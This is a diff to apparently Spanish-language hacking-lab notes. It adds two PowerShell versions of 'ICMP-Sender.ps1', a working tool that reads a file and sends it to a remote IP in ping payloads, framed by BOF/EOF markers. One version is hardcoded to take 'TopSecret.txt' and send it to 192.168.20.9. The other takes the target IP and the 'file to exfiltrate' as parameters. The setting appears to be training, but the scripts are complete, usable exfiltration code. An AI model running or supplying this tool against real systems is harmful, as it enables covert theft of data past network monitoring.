@@ -112,16 +112,61 @@ awk 'NR % 2 == 1' data.txt | xxd -ps -r
 ### `ICMP-Sender.ps1`
 
 ```powershell
-param (
-    [string]$IPAddress,
-    [string]$inFile
-)
-
+$IPAddress = "192.168.20.9"
 $ICMPClient = New-Object System.Net.NetworkInformation.Ping
 $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
 $PingOptions.DontFragment = $true
+#$PingOptions.Ttl = 10
+
+# Must be divided into 1472 chunks
+[int]$bufSize = 1472
+$inFile = "C:\Users\antonio\eHacking_LABS\50\TopSecret.txt"
+
+$stream = [System.IO.File]::OpenRead($inFile)
+$chunkNum = 0
+$TotalChunks = [math]::floor($stream.Length / 1472)
+$barr = New-Object byte[] $bufSize
+
+# Start of Transfer
+$sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
+$ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
+
+while ($bytesRead = $stream.Read($barr, 0, $bufsize)) {
+    $ICMPClient.Send($IPAddress,10, $barr, $PingOptions) | Out-Null
+    $ICMPClient.PingCompleted
+    
+    # Missing check if transfer is okay, added sleep.
+    sleep 1
+    # $ICMPClient.SendAsync($IPAddress,60 * 1000, $barr, $PingOptions) | Out-Null
+    Write-Output "Done with $chunkNum out of $TotalChunks"
+    $chunkNum += 1
+}
+
+# End the transfer
+$sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
+$ICMPClient.Send($IPAddress,10, $sendbytes, $PingOptions) | Out-Null
+$stream.Dispose()
+Write-Output "File Transfered"
+```
+### `ICMP-Sender.ps1` (Con imput de usuario)
+```powershell
+# --- PARÁMETROS ---
+param (
+    [Parameter(Mandatory = $true, HelpMessage = "Especifique la dirección IP de destino.")]
+    [string]$IPAddress,
+
+    [Parameter(Mandatory = $true, HelpMessage = "Especifique la ruta completa del archivo a exfiltrar.")]
+    [string]$inFile
+)
+
+# --- VARIABLES ---
+$ICMPClient = New-Object System.Net.NetworkInformation.Ping
+$PingOptions = New-Object System.Net.NetworkInformation.PingOptions
+$PingOptions.DontFragment = $true
+
 [int]$bufSize = 1472
 
+# --- VALIDACIONES ---
 if (-not (Test-Path $inFile)) {
     Write-Error "El archivo especificado no existe: $inFile"
     exit 1
@@ -132,6 +177,7 @@ $chunkNum = 0
 $TotalChunks = [math]::floor($stream.Length / $bufSize)
 $barr = New-Object byte[] $bufSize
 
+# --- INICIO DE TRANSFERENCIA ---
 $sendbytes = ([text.encoding]::ASCII).GetBytes("BOFAwesomefile.txt")
 $ICMPClient.Send($IPAddress, 10, $sendbytes, $PingOptions) | Out-Null
 
@@ -142,12 +188,14 @@ while ($bytesRead = $stream.Read($barr, 0, $bufSize)) {
     $chunkNum++
 }
 
+# --- FIN DE TRANSFERENCIA ---
 $sendbytes = ([text.encoding]::ASCII).GetBytes("EOF")
 $ICMPClient.Send($IPAddress, 10, $sendbytes, $PingOptions) | Out-Null
 $stream.Dispose()
 
 Write-Output "Transferencia del archivo completada."
 ```
+
 
 ---
 
